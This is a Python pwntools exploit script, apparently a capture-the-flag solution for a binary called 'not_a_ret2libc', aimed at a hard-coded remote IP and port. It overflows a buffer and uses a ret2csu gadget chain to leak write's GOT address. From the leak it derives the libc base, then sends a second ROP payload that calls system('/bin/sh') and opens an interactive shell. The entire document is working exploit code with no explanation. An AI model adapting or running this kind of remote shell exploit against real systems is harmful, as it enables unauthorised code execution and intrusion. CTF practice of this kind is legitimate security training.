from pwn import * 

r = remote("45.122.249.68", 10022)
# r = process('./not_a_ret2libc')
elf = context.binary = ELF('./not_a_ret2libc')
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF('./libc-2.31.so')
csu1 = 0x4011fa #pop rbx, rbp, r12, r13, r14, r15
# r12 = rdi; r13 = rsi; r14 = rdx
csu2 = 0x4011e0
pop_rdi = 0x401203
ret = 0x40101a
payload = b'a'*9 + p64(csu1) + p64(0) + p64(1) + p64(1) + p64(elf.got['write']) + p64(6) + p64(elf.got['write'])
payload += p64(csu2) + b"A"*56 + p64(elf.sym['main']) 

r.sendline(payload)
r.recvuntil(b"give me something please: \x00")
leak = r.recvuntil(b"give me",drop = True)
leak = u64(leak.ljust(8,b'\x00'))
print("write leak: "+hex(leak))
libc.address = leak - libc.sym['write']
print("libc base: " +hex(libc.address))
payload_1 = b'a'*9 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendline(payload_1)
r.interactive()
